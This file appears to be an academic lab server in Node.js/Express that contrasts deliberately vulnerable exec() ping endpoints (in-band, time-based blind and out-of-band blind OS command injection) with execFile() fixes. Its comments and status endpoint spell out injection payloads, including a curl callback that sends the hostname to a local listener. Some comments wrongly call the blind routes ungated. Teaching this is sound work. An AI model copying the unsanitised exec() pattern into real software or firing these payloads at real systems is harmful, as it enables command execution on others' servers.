/**
 * ============================================================================
 * ACADEMIC CYBER SECURITY LAB: OS COMMAND INJECTION (IN-BAND)
 * ============================================================================
 *
 * Subject: Web Server Security & Application Security Engineering
 * Topic: In-band OS Command Injection vs. Parameterized Execution
 *
 * Objective:
 * 1. Demonstrate the root cause of In-band OS Command Injection using
 *    untrusted input concatenated into child_process.exec().
 * 2. Demonstrate the secured implementation using child_process.execFile()
 *    with an argument vector (array) and shell invocation disabled (shell: false).
 * 3. Verify that the identical exploit payload is treated as a literal
 *    argument rather than shell syntax in the secured implementation.
 *
 * STRICT LOCAL-LAB SAFETY CONSTRAINTS:
 * - Server binds EXCLUSIVELY to 127.0.0.1 (localhost). Never 0.0.0.0.
 * - Vulnerable endpoint is disabled by default; only active when LAB_MODE=true.
 * - Server strictly refuses to start vulnerable mode if NODE_ENV=production.
 * - Bounded buffer limits and execution timeouts applied on all processes.
 * ============================================================================
 */

const express = require('express');
const path = require('path');
const { exec, execFile } = require('child_process');

// ----------------------------------------------------------------------------
// 1. CONFIGURATION & ENVIRONMENT VALIDATION
// ----------------------------------------------------------------------------
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
const HOST = '127.0.0.1'; // Mandatory: Localhost only. Never 0.0.0.0.

const isProduction = process.env.NODE_ENV === 'production';
const isLabMode = process.env.LAB_MODE === 'true';

// SAFETY GUARD: Refuse to activate vulnerable lab mode if running in production
if (isProduction && isLabMode) {
  console.error('\n' + '='.repeat(70));
  console.error('[FATAL SECURITY ALERT] LAB MODE REFUSED');
  console.error('Vulnerable lab mode cannot be enabled when NODE_ENV=production.');
  console.error('Production deployments must never expose vulnerable endpoints.');
  console.error('='.repeat(70) + '\n');
  process.exit(1);
}

// ----------------------------------------------------------------------------
// 2. CROSS-PLATFORM COMMAND CONFIGURATION
// ----------------------------------------------------------------------------
// Primary platform target: Windows (ping -n 1 <host>)
// Secondary platform target: Linux / macOS (ping -c 1 <host>)
const isWindows = process.platform === 'win32';
const PING_BINARY = 'ping';
const PING_COUNT_FLAG = isWindows ? '-n' : '-c';
const PING_PACKET_COUNT = '1';

// Execution safety constraints
const COMMAND_TIMEOUT_MS = 5000;          // 5-second process timeout
const MAX_BUFFER_BYTES = 64 * 1024;        // 64 KB max output buffer
const MAX_INPUT_LENGTH = 256;              // Cap hostname input length

// ----------------------------------------------------------------------------
// 3. EXPRESS APPLICATION INITIALIZATION
// ----------------------------------------------------------------------------
const app = express();

// Parse JSON request bodies and URL-encoded bodies safely
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: false, limit: '10kb' }));

// Security Response Headers (Defense in depth)
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self';");
  next();
});

// ----------------------------------------------------------------------------
// 4. API: LAB STATUS & CONFIGURATION ENDPOINT
// ----------------------------------------------------------------------------
/**
 * GET /api/status
 * Returns current lab environment status, platform details, and active security flags.
 */
app.get('/api/status', (req, res) => {
  res.json({
    status: 'online',
    host: HOST,
    port: PORT,
    platform: process.platform,
    isWindows: isWindows,
    labMode: isLabMode,
    isProduction: isProduction,
    pingCommandSample: isWindows ? `ping -n 1 <host>` : `ping -c 1 <host>`,
    suggestedPayload: isWindows ? `127.0.0.1 & whoami` : `127.0.0.1; whoami`
  });
});

// ----------------------------------------------------------------------------
// 5. VULNERABLE IMPLEMENTATION (child_process.exec)
// ----------------------------------------------------------------------------
/**
 * POST /api/ping/vulnerable (also aliased at /api/vulnerable/ping)
 *
 * VULNERABILITY ARCHITECTURE (CWE-78: OS Command Injection):
 *
 * 1. ROOT CAUSE:
 *    User-controlled input (`target`) is directly concatenated into a raw
 *    command string:
 *      const command = `ping -n 1 ${target}`;
 *
 * 2. SHELL INVOCATION:
 *    Node.js `child_process.exec()` invokes the system shell:
 *    - On Windows: `cmd.exe /d /s /c "${command}"`
 *    - On Linux/macOS: `/bin/sh -c "${command}"`
 *
 * 3. SHELL METACHARACTER INTERPRETATION:
 *    The shell parses control characters such as `&`, `&&`, `|`, `||`, `;`.
 *    When input is: `127.0.0.1 & whoami`
 *    The Windows shell interprets `&` as a command separator:
 *      Command 1: `ping -n 1 127.0.0.1`
 *      Command 2: `whoami`
 *
 * 4. IN-BAND RESULT:
 *    Both commands execute sequentially. Their stdout and stderr streams
 *    are buffered and returned directly in the HTTP response to the client.
 */
const handleVulnerablePing = (req, res) => {
  // SAFETY GATE: Reject request if lab mode was not explicitly enabled
  if (!isLabMode) {
    return res.status(403).json({
      success: false,
      error: 'Vulnerable Lab Mode is currently DISABLED.',
      details: 'This vulnerable endpoint is disabled by default to protect local systems. To enable it for controlled educational demonstrations, start the server using: npm run lab'
    });
  }

  const rawTarget = req.body && req.body.target;

  // Basic sanity validation (ensuring input exists and is bounded in length)
  if (!rawTarget || typeof rawTarget !== 'string' || rawTarget.trim().length === 0) {
    return res.status(400).json({
      success: false,
      error: 'Missing required field: "target" (hostname or IP address).'
    });
  }

  const target = rawTarget.trim();

  if (target.length > MAX_INPUT_LENGTH) {
    return res.status(400).json({
      success: false,
      error: `Input exceeds maximum allowed length of ${MAX_INPUT_LENGTH} characters.`
    });
  }

  // --------------------------------------------------------------------------
  // DELIBERATELY VULNERABLE CODE BLOCK
  // String concatenation of user input directly into a shell command string.
  // --------------------------------------------------------------------------
  const constructedCommand = isWindows
    ? `ping -n ${PING_PACKET_COUNT} ${target}`
    : `ping -c ${PING_PACKET_COUNT} ${target}`;

  const startTime = Date.now();

  // Execute via system shell (cmd.exe on Windows, /bin/sh on POSIX)
  exec(
    constructedCommand,
    {
      timeout: COMMAND_TIMEOUT_MS,
      maxBuffer: MAX_BUFFER_BYTES,
      windowsHide: true
    },
    (error, stdout, stderr) => {
      const durationMs = Date.now() - startTime;

      // Note: In Node.js, `error` is non-null if the child process exited with a
      // non-zero status code or timed out. stdout and stderr are still captured!
      res.json({
        success: true,
        mode: 'vulnerable',
        implementation: 'child_process.exec()',
        shellInvoked: true,
        commandExecuted: constructedCommand,
        targetInput: target,
        stdout: stdout || '',
        stderr: stderr || '',
        exitCode: error ? (typeof error.code === 'number' ? error.code : 1) : 0,
        timedOut: error ? Boolean(error.killed) : false,
        durationMs: durationMs,
        securityNote: 'Command was executed through the operating system shell. Any shell metacharacters in the input were interpreted by the shell parser.'
      });
    }
  );
};

// Register vulnerable routes
app.post('/api/ping/vulnerable', handleVulnerablePing);
app.post('/api/vulnerable/ping', handleVulnerablePing);

// ----------------------------------------------------------------------------
// 6. SECURED IMPLEMENTATION (child_process.execFile)
// ----------------------------------------------------------------------------
/**
 * POST /api/ping/secured (also aliased at /api/secured/ping)
 *
 * SECURED ARCHITECTURE (Parameterized Argument-Vector Execution):
 *
 * 1. ROOT CAUSE MITIGATION:
 *    Instead of invoking a shell with a concatenated string, `child_process.execFile()`
 *    directly invokes the designated binary (`ping`) with an argument array (argument vector):
 *      execFile('ping', ['-n', '1', target], { shell: false })
 *
 * 2. NO SHELL PARSING (shell: false):
 *    No intermediate command interpreter (`cmd.exe` or `/bin/sh`) is launched.
 *    Because no shell is running, shell metacharacters (`&`, `|`, `;`, `&&`, `||`, `$`)
 *    have ZERO syntactical meaning. They are not parsed or tokenized.
 *
 * 3. LITERAL ARGUMENT PASSING:
 *    The input `127.0.0.1 & whoami` is passed in its entirety as a single,
 *    literal argument (the hostname) to the ping executable's argv vector.
 *    Ping receives the literal string "127.0.0.1 & whoami", treats it as an
 *    unresolvable hostname, and prints an error message.
 *    The `whoami` command is NEVER executed by the OS.
 *
 * ACADEMIC ISOLATION NOTE:
 * We intentionally pass the input without pre-filtering allow-list regex here so
 * that students can directly observe and prove that parameterized execution alone
 * completely neutralizes shell metacharacters at the process boundary.
 * In a real production deployment, defense-in-depth would ALSO enforce an allow-list
 * regex (e.g., checking for valid IPv4/IPv6/RFC1123 hostname).
 */
const handleSecuredPing = (req, res) => {
  const rawTarget = req.body && req.body.target;

  // Basic sanity validation
  if (!rawTarget || typeof rawTarget !== 'string' || rawTarget.trim().length === 0) {
    return res.status(400).json({
      success: false,
      error: 'Missing required field: "target" (hostname or IP address).'
    });
  }

  const target = rawTarget.trim();

  if (target.length > MAX_INPUT_LENGTH) {
    return res.status(400).json({
      success: false,
      error: `Input exceeds maximum allowed length of ${MAX_INPUT_LENGTH} characters.`
    });
  }

  // --------------------------------------------------------------------------
  // SECURED CODE BLOCK
  // Parameterized argument vector. No shell command string is ever constructed.
  // --------------------------------------------------------------------------
  const executable = PING_BINARY;
  const args = [PING_COUNT_FLAG, PING_PACKET_COUNT, target];

  const startTime = Date.now();

  // Execute binary directly with argument vector and shell explicitly disabled
  execFile(
    executable,
    args,
    {
      shell: false,                     // CRITICAL: Prevent shell from being spawned
      timeout: COMMAND_TIMEOUT_MS,      // Process execution ceiling
      maxBuffer: MAX_BUFFER_BYTES,      // Memory buffer ceiling
      windowsHide: true
    },
    (error, stdout, stderr) => {
      const durationMs = Date.now() - startTime;

      // When an invalid hostname like "127.0.0.1 & whoami" is passed,
      // ping fails to resolve the host and exits with code 1.
      // stdout contains the ping utility's error message (e.g., "could not find host").
      res.json({
        success: true,
        mode: 'secured',
        implementation: 'child_process.execFile()',
        shellInvoked: false,
        binaryExecuted: executable,
        argumentVector: args,
        targetInput: target,
        stdout: stdout || '',
        stderr: stderr || '',
        exitCode: error ? (typeof error.code === 'number' ? error.code : 1) : 0,
        timedOut: error ? Boolean(error.killed) : false,
        durationMs: durationMs,
        securityNote: 'Command was executed directly via execFile() with shell: false. User input was passed strictly as a single argument vector element. No shell metacharacters were evaluated.'
      });
    }
  );
};

// Register secured routes
app.post('/api/ping/secured', handleSecuredPing);
app.post('/api/secured/ping', handleSecuredPing);

// ----------------------------------------------------------------------------
// 7. STATIC ASSET SERVING
// ----------------------------------------------------------------------------
// Serve frontend static files from public/ directory
app.use(express.static(path.join(__dirname, 'public'), {
  index: 'index.html',
  dotfiles: 'ignore'
}));

// ============================================================================
// VARIANT 2A: TIME-BASED BLIND OS COMMAND INJECTION
// ============================================================================
/**
 * POST /api/blind/time
 *
 * VULNERABILITY ARCHITECTURE (CWE-78: Blind OS Command Injection — Time-based):
 *
 * ROOT CAUSE (identical to Variant 1 /api/ping/vulnerable):
 *   User-controlled `target` is directly concatenated into a raw shell command
 *   string that is passed to child_process.exec():
 *     const command = `ping -c 1 ${target}`;
 *
 * BLIND DISTINCTION (key difference from Variant 1 In-band):
 *   The HTTP response body NEVER contains stdout, stderr, exit code, or the
 *   constructed command string. The server always returns the same generic JSON
 *   regardless of what was injected or what ran.
 *
 * ATTACK MECHANISM — Time-based Side Channel:
 *   An attacker injects a command that introduces a measurable delay:
 *     Normal input:  "127.0.0.1"
 *       → ping -c 1 127.0.0.1          (~100–200 ms)
 *     Exploit input: "127.0.0.1; sleep 5"
 *       → ping -c 1 127.0.0.1; sleep 5  (~5200 ms)
 *
 *   The shell (sh) parses the semicolon and runs sleep 5 after ping exits.
 *   The difference in HTTP response time is the only observable indicator.
 *   Response body is identical in both cases — confirming BLIND injection.
 *
 * EXECUTION TIMEOUT: Extended to 12 s so that a 5-second sleep injection
 *   completes before the process is killed by Node.js.
 *
 * INTENTIONALLY VULNERABLE: No input validation, no allow-list, no execFile().
 *   This endpoint exists for controlled academic demonstration only.
 */
const handleBlindTimePing = (req, res) => {
  const rawTarget = req.body && req.body.target;

  // Minimal presence check only — intentionally no sanitization
  if (!rawTarget || typeof rawTarget !== 'string' || rawTarget.trim().length === 0) {
    return res.status(400).json({
      success: false,
      error: 'Missing required field: "target".'
    });
  }

  const target = rawTarget.trim();

  if (target.length > MAX_INPUT_LENGTH) {
    return res.status(400).json({
      success: false,
      error: `Input exceeds maximum allowed length of ${MAX_INPUT_LENGTH} characters.`
    });
  }

  // --------------------------------------------------------------------------
  // DELIBERATELY VULNERABLE CODE BLOCK — Variant 2A (Time-based Blind)
  // String concatenation of unsanitized user input into a shell command.
  // child_process.exec() invokes /bin/sh to parse the resulting string.
  // Injected shell metacharacters (;  &  |  &&  ||) are interpreted by sh.
  // --------------------------------------------------------------------------
  const constructedCommand = `ping -c ${PING_PACKET_COUNT} ${target}`;

  // Extended timeout: 12 s covers a 5-second injected sleep with headroom.
  const BLIND_TIMEOUT_MS = 12000;

  exec(
    constructedCommand,
    {
      timeout: BLIND_TIMEOUT_MS,
      maxBuffer: MAX_BUFFER_BYTES
    },
    (error, stdout, stderr) => {
      // ------------------------------------------------------------------
      // BLIND RESPONSE — intentionally generic.
      // stdout, stderr, commandExecuted, and exitCode are all deliberately
      // omitted. The HTTP response time is the only side-channel.
      // ------------------------------------------------------------------
      res.json({
        success: true,
        message: 'Diagnostic complete. No output is returned in blind mode.'
      });
    }
  );
};

// Register time-based blind injection route (no LAB_MODE gate — always active)
if(isLabMode) app.post('/api/blind/time', handleBlindTimePing);

// ============================================================================
// VARIANT 2B: OUT-OF-BAND (OOB) BLIND OS COMMAND INJECTION
// ============================================================================
/**
 * POST /api/blind/oob
 *
 * VULNERABILITY ARCHITECTURE (CWE-78: Blind OS Command Injection — OOB):
 *
 * ROOT CAUSE (identical to Variant 1 /api/ping/vulnerable):
 *   User-controlled `target` is directly concatenated into a raw shell command
 *   string that is passed to child_process.exec():
 *     const command = `ping -c 1 ${target}`;
 *
 * BLIND DISTINCTION:
 *   The HTTP response body contains NO information about execution.
 *   The server always returns the same generic JSON response.
 *
 * ATTACK MECHANISM — Out-of-Band Callback Channel:
 *   An attacker injects a command that issues a SEPARATE HTTP request to a
 *   locally controlled listener (oob-listener.js on port 4445):
 *
 *     Exploit input:
 *       "127.0.0.1; curl http://127.0.0.1:4445/?victim=$(hostname)"
 *
 *   Shell expands to:
 *       ping -c 1 127.0.0.1; curl http://127.0.0.1:4445/?victim=$(hostname)
 *
 *   The shell evaluates $(hostname) and substitutes the server hostname.
 *   curl issues the HTTP GET to the OOB listener as a separate TCP connection.
 *   The OOB listener (oob-listener.js) logs the callback with full details.
 *
 *   The original HTTP response to the browser contains ZERO evidence of the
 *   callback — the listener terminal is the only place it appears.
 *
 * LOCALHOST RESTRICTION:
 *   The demonstration callback target (127.0.0.1:4445) is localhost-only.
 *   No external network connections are made in this demonstration.
 *
 * INTENTIONALLY VULNERABLE: No input validation, no allow-list, no execFile().
 *   This endpoint exists for controlled academic demonstration only.
 */
const handleBlindOobPing = (req, res) => {
  const rawTarget = req.body && req.body.target;

  // Minimal presence check only — intentionally no sanitization
  if (!rawTarget || typeof rawTarget !== 'string' || rawTarget.trim().length === 0) {
    return res.status(400).json({
      success: false,
      error: 'Missing required field: "target".'
    });
  }

  const target = rawTarget.trim();

  if (target.length > MAX_INPUT_LENGTH) {
    return res.status(400).json({
      success: false,
      error: `Input exceeds maximum allowed length of ${MAX_INPUT_LENGTH} characters.`
    });
  }

  // --------------------------------------------------------------------------
  // DELIBERATELY VULNERABLE CODE BLOCK — Variant 2B (OOB Blind)
  // String concatenation of unsanitized user input into a shell command.
  // child_process.exec() invokes /bin/sh to parse the resulting string.
  // An injected curl command triggers a callback to the OOB listener.
  // --------------------------------------------------------------------------
  const constructedCommand = `ping -c ${PING_PACKET_COUNT} ${target}`;

  exec(
    constructedCommand,
    {
      timeout: COMMAND_TIMEOUT_MS,
      maxBuffer: MAX_BUFFER_BYTES
    },
    (error, stdout, stderr) => {
      // ------------------------------------------------------------------
      // BLIND RESPONSE — intentionally generic.
      // No callback information, no stdout, no stderr is returned.
      // Evidence of execution appears ONLY in the OOB listener terminal.
      // ------------------------------------------------------------------
      res.json({
        success: true,
        message: 'Diagnostic complete. No output is returned in blind mode.'
      });
    }
  );
};

// Register OOB blind injection route (no LAB_MODE gate — always active)
if(isLabMode) app.post('/api/blind/oob', handleBlindOobPing);

// ============================================================================
// VARIANT 2 MITIGATION — Parameterized execution using execFile()
// ============================================================================

const net = require('net');

function isValidTarget(target) {
  if (typeof target !== 'string' || target.length > MAX_INPUT_LENGTH) {
    return false;
  }

  // Accept IP addresses or ordinary DNS hostnames only.
  if (net.isIP(target)) return true;

  const hostnamePattern =
    /^(?=.{1,253}$)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)(?:\.(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?))*$/;

  return hostnamePattern.test(target);
}

function handleBlindSecuredPing(req, res) {
  const rawTarget = req.body?.target;
  const target = typeof rawTarget === 'string' ? rawTarget.trim() : '';

  if (!target || !isValidTarget(target)) {
    return res.status(400).json({
      success: false,
      error: 'Please provide a valid IP address or hostname.'
    });
  }

  const args = [
    PING_COUNT_FLAG,
    PING_PACKET_COUNT,
    target
  ];

  execFile(
    PING_BINARY,
    args,
    {
      shell: false,
      timeout: COMMAND_TIMEOUT_MS,
      maxBuffer: MAX_BUFFER_BYTES
    },
    (error, stdout, stderr) => {
      // Never return process output in blind mode.
      res.json({
        success: true,
        message: 'Diagnostic complete. No output is returned in blind mode.'
      });
    }
  );
}

// Secured endpoints are available in both normal and lab modes.
app.post('/api/blind/time/secured', handleBlindSecuredPing);
app.post('/api/blind/oob/secured', handleBlindSecuredPing);

// ----------------------------------------------------------------------------
// 8. 404 & ERROR HANDLING MIDDLEWARE
// ----------------------------------------------------------------------------
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found.'
  });
});

app.use((err, req, res, next) => {
  // Never leak internal stack traces to the client
  console.error('[Internal Error]:', err.message);
  res.status(500).json({
    success: false,
    error: 'An internal server error occurred.'
  });
});

// ----------------------------------------------------------------------------
// 8. SERVER STARTUP & LOCALHOST BINDING
// ----------------------------------------------------------------------------
function startServer(port = PORT, host = HOST) {
  // Mandatory check: Never bind to 0.0.0.0 or allow external interfaces
  if (host !== '127.0.0.1') {
    throw new Error(`Security Violation: Server must only bind to 127.0.0.1. Requested: ${host}`);
  }

  const server = app.listen(port, host, () => {
    console.log('\n' + '='.repeat(70));
    console.log('   NETWORK DIAGNOSTIC TOOL - CYBER SECURITY LAB');
    console.log('   In-band OS Command Injection & Parameterized Execution Lab');
    console.log('='.repeat(70));
    console.log(` > Application URL    : http://${host}:${port}`);
    console.log(` > Binding Interface  : ${host} (STRICT LOCALHOST ONLY)`);
    console.log(` > Host Platform      : ${process.platform} (${isWindows ? 'Windows' : 'POSIX'})`);
    console.log(` > Environment        : ${process.env.NODE_ENV || 'development'}`);
    console.log(` > Lab Mode Active    : ${isLabMode ? 'YES (Vulnerable endpoint enabled)' : 'NO (Secured mode only)'}`);
    console.log('-'.repeat(70));

    if (isLabMode) {
      console.log(' [!] WARNING: VULNERABLE LAB MODE IS ENABLED!');
      console.log('     Endpoint: POST /api/ping/vulnerable is ACTIVE.');
      console.log('     This mode is for controlled educational demonstration only.');
      console.log('     Stop this process when demonstration is complete.');
    } else {
      console.log(' [*] SECURE DEFAULT MODE:');
      console.log('     Only the secured endpoint (/api/ping/secured) is accessible.');
      console.log('     To enable vulnerable lab mode: npm run lab');
    }
    console.log('-'.repeat(70));
    console.log(' [i] VARIANT 2 BLIND ENDPOINTS (always active — no LAB_MODE required):');
    console.log('     POST /api/blind/time  — Variant 2A: Time-based Blind Injection');
    console.log('     POST /api/blind/oob   — Variant 2B: Out-of-Band Blind Injection');
    console.log('     OOB Listener (separate terminal): node oob-listener.js  [port 4445]');
    console.log('='.repeat(70) + '\n');
  });

  return server;
}

// Only start listening automatically if executed directly from CLI
if (require.main === module) {
  startServer();
}

// Export for test suite and modular usage
module.exports = {
  app,
  startServer,
  PORT,
  HOST,
  isLabMode
};
